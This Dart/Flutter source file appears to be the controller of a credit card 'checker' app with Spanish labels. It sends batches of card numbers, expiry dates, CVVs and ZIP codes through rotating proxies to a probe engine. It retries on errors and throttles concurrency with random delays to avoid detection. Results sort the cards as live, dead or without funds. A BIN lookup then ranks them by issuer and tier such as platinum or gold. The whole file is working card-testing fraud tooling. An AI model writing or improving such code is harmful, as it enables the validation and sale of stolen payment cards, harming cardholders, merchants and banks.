          class MissionState {
            MissionState({this.running = false, this.note = '', this.progress = 0, this.kind = ''});
            final bool running;
            final String note;
            final double progress;
            final String kind;
            MissionState copyWith({bool? running, String? note, double? progress, String? kind}) => MissionState(
                  running: running ?? this.running,
                  note: note ?? this.note,
                  progress: progress ?? this.progress,
                  kind: kind ?? this.kind,
                );
          }

          final missionProvider = StateNotifierProvider<MissionNotifier, MissionState>((ref) => MissionNotifier(ref));

          class MissionNotifier extends StateNotifier<MissionState> {
            MissionNotifier(this.ref) : super(MissionState());
            final Ref ref;
            bool _cancel = false;

            List<CreditCard> _scope(String s) {
              final all = ref.read(cardsProvider);
              switch (s) {
                case 'sin_revisar':
                  return all.where((c) => c.status == CheckStatus.unchecked).toList();
                case 'inciertas':
                  return all.where((c) => c.status == CheckStatus.unknown).toList();
                case 'sin_saldo':
                  return all.where((c) => c.status == CheckStatus.noFunds).toList();
                case 'revisar':
                  return all.where((c) => c.status == CheckStatus.review).toList();
                case 'muertas':
                  return all.where((c) => c.status == CheckStatus.dead).toList();
                case 'vivas':
                  return all.where((c) => c.status == CheckStatus.live).toList();
                default:
                  return all;
              }
            }

            Future<void> _preflight(CheckEngine engine) async {
              final list = ref.read(proxiesProvider);
              if (list.isEmpty) return;
              state = MissionState(running: true, kind: 'preflight', note: '0/${list.length}');
              var done = 0;
              var cursor = 0;
              Future<void> worker() async {
                while (!_cancel) {
                  final i = cursor;
                  if (i >= list.length) return;
                  cursor++;
                  final p = list[i];
                  final out = await engine.probe(p);
                  p.ok += out.ok ? 1 : 0;
                  p.fail += out.ok ? 0 : 1;
                  p.totalMs += out.ms;
                  p.latencyMs = out.ms;
                  p.streak = out.ok ? 0 : p.streak + 1;
                  p.health = out.ok ? ProxyHealth.up : ProxyHealth.down;
                  if (!out.ok) p.cooldownUntil = DateTime.now().add(const Duration(seconds: 120));
                  done++;
                  state = state.copyWith(progress: done / list.length, note: 'preflight $done/${list.length}');
                }
              }

              await Future.wait(List.generate(8, (_) => worker()));
              await ref.read(proxiesProvider.notifier).save();
              ref.read(proxiesProvider.notifier).touch();
            }

            Future<void> check(String scope) async {
              if (state.running) return;
              _cancel = false;
              final cards = _scope(scope);
              if (cards.isEmpty) {
                state = MissionState(kind: 'chequeo', note: 'nada para chequear', progress: 1);
                return;
              }
              final cfg = ref.read(settingsProvider);
              final engine = CheckEngine(cfg);
              final pool = ProxyPool(cfg, ref.read(proxiesProvider));

              if (cfg.preflight) await _preflight(engine);
              if (_cancel) {
                engine.dispose();
                state = MissionState(kind: 'chequeo', note: 'cancelado');
                return;
              }

              final lanes = cfg.concurrency.clamp(1, 24);
              final gate = Gate(lanes);
              final window = <bool>[];
              final rnd = Random();

              ref.read(statsProvider.notifier).state = CheckStats();
              state = MissionState(running: true, kind: 'chequeo', note: '0/${cards.length}');
              var done = 0;
              var cursor = 0;

              Future<void> worker() async {
                while (!_cancel) {
                  final i = cursor;
                  if (i >= cards.length) return;
                  cursor++;
                  final card = cards[i];
                  await gate.acquire();
                  CheckOutcome out;
                  ProxyNode? used;
                  try {
                    out = const CheckOutcome(ok: false, error: true, ms: 0, note: 'sin respuesta');
                    var tries = 0;
                    while (true) {
                      used = pool.next();
                      out = await engine.probe(
                        used,
                        pan: card.pan,
                        mm: card.expMonth,
                        yy: card.expYear,
                        cvv: card.cvv,
                        zip: card.zip,
                      );
                      if (!out.error || tries >= cfg.retries) break;
                      tries++;
                    }
                  } finally {
                    gate.release();
                  }
                  if (used != null) pool.report(used, out);

                  window.add(out.error);
                  if (window.length > 20) window.removeAt(0);
                  if (cfg.adaptive && window.length >= 8) {
                    final rate = window.where((e) => e).length / window.length;
                    if (rate > 0.35) {
                      gate.setCap((gate.cap - 1).clamp(2, lanes));
                    } else if (rate < 0.1) {
                      gate.setCap((gate.cap + 1).clamp(1, lanes));
                    }
                  }

                  done++;
                  final st = ref.read(statsProvider);
                  ref.read(statsProvider.notifier).state = st.copyWith(
                        done: st.done + 1,
                        live: st.live + (out.status == CheckStatus.live ? 1 : 0),
                        noFunds: st.noFunds + (out.status == CheckStatus.noFunds ? 1 : 0),
                        review: st.review + (out.status == CheckStatus.review ? 1 : 0),
                        dead: st.dead + (out.status == CheckStatus.dead ? 1 : 0),
                        errors: st.errors + (out.error ? 1 : 0),
                      );

                  await ref.read(cardsProvider.notifier).setStatus(
                        card.id,
                        out.status,
                        out.code.isEmpty ? null : out.code,
                      );
                  if (out.avs.isNotEmpty) card.avs = out.avs;
                  state = state.copyWith(progress: done / cards.length, note: '$done/${cards.length}');

                  if (out.error && cfg.adaptive) {
                    await Future.delayed(Duration(milliseconds: 70 + rnd.nextInt(130)));
                  }
                }
              }

              await Future.wait(List.generate(lanes, (_) => worker()));
              await ref.read(cardsProvider.notifier).persist();
              await ref.read(proxiesProvider.notifier).save();
              engine.dispose();
              state = MissionState(kind: 'chequeo', note: 'listo', progress: 1);
            }

            CardTier _tierFor(String level) {
              final l = level.toUpperCase();
              if (l.contains('PLATINUM') || l.contains('SIGNATURE') || l.contains('INFINITE') || l.contains('WORLD ELITE')) {
                return CardTier.platinum;
              }
              if (l.contains('GOLD') || l.contains('TITANIUM')) return CardTier.gold;
              if (l.contains('SILVER') || l.contains('CLASSIC') || l.contains('STANDARD')) return CardTier.silver;
              return CardTier.bronze;
            }

            void _apply(CreditCard c, BinInfo i) {
              c.enriched = true;
              if (i.brand.isNotEmpty) c.brand = i.brand;
              if (i.bank.isNotEmpty) c.bank = i.bank;
              if (i.country.isNotEmpty) c.country = i.country;
              if (i.alpha2.isNotEmpty) c.countryCode = i.alpha2;
              c.level = i.level;
              c.issuerPhone = i.phone;
              c.issuerUrl = i.url;
              c.tier = _tierFor(i.level);
            }

            Future<void> enrich({List<String>? ids}) async {
              if (state.running) return;
              _cancel = false;
              final all = ref.read(cardsProvider);
              final cards = ids == null
                  ? all.where((c) => !c.enriched).toList()
                  : all.where((c) => ids.contains(c.id) && !c.enriched).toList();
              if (cards.isEmpty) {
                state = MissionState(kind: 'BIN', note: 'ya está todo enriquecido', progress: 1);
                return;
              }
              final db = BinDb.i;
              final offline = db.ready;
              state = MissionState(running: true, kind: 'BIN', note: '0/${cards.length}');
              var done = 0;
              var cursor = 0;

              Future<void> worker() async {
                while (!_cancel) {
                  final i = cursor;
                  if (i >= cards.length) return;
                  cursor++;
                  final c = cards[i];
                  var info = db.lookup(c.pan);
                  info ??= await db.online(c.bin);
                  if (info != null) _apply(c, info);
                  done++;
                  state = state.copyWith(progress: done / cards.length, note: '$done/${cards.length}');
                }
              }

              await Future.wait(List.generate(offline ? 8 : 4, (_) => worker()));
              await ref.read(cardsProvider.notifier).persist();
              ref.read(cardsProvider.notifier).reload();
              state = MissionState(kind: 'BIN', note: 'listo', progress: 1);
            }

            Future<void> downloadDb() async {
              if (state.running) return;
              _cancel = false;
              state = MissionState(running: true, kind: 'base BIN', note: 'descargando…');
              try {
                await BinDb.i.download((n) {
                  state = state.copyWith(note: '$n líneas');
                });
                state = MissionState(kind: 'base BIN', note: 'lista · ${BinDb.i.size} BINs', progress: 1);
              } catch (e) {
                state = MissionState(kind: 'base BIN', note: 'error: $e');
              }
              ref.read(dbTickProvider.notifier).state++;
            }

            void stop() => _cancel = true;
          }
